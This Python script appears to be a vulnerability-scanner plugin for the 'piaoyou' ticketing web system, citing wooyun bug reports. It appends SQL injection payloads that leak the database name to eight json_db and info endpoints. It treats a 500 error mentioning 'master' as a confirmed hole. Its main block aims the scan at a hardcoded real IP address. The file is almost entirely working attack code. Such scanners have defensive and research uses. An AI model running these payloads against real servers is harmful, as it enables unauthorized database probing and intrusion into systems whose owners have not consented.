#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101090
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101091
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101092
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101093
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101102
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101103
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101104
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101106

import re 

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
        
        
        
def audit(arg): 
    
    payload1 = [ 'json_db/other_report.aspx?its=3&jq=0&stype=&dfs=0&levels=111',
    'json_db/flight_return.aspx?sdate=2015-03-13&edate=2015-03-13&cp=11111',
    'json_db/meb_list.aspx?type=11',
    'json_db/air_company.aspx?air=0&key=11',
    'json_db/order_gys.aspx?stype=0&key=11111',
    'Json_db/flight_report.aspx?dd=0&ee=2015-03-12&ff=2015-03-12&rr=1',
    'Json_db/flight_search.aspx?jq=0&kefu=admin&stype=&ptype=&ddw=1&sdate=2010-03-12&edate=2015-03-12&cp=1',
    'info/zclist_view.aspx?id='
    ]
    
    
    payload2 = '%27%20and%20db_name%281%29%3E1%20or%20%271%27%3D%272'
    payload3 = '%28%20select%20db_name%281%29%29'
    for payload in payload1:
        match1 = re.search('info',payload)
        if match1:
            url = arg + payload + payload3
        else:
            url = arg + payload + payload2
        code, head, res, errcode, _ = curl.curl2(url)
        m = re.search('master',res)
        if code == 500 and m:
            security_hole(arg + payload + "   :found sql Injection")
           




if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou', 'http://58.42.249.181:82/')[1])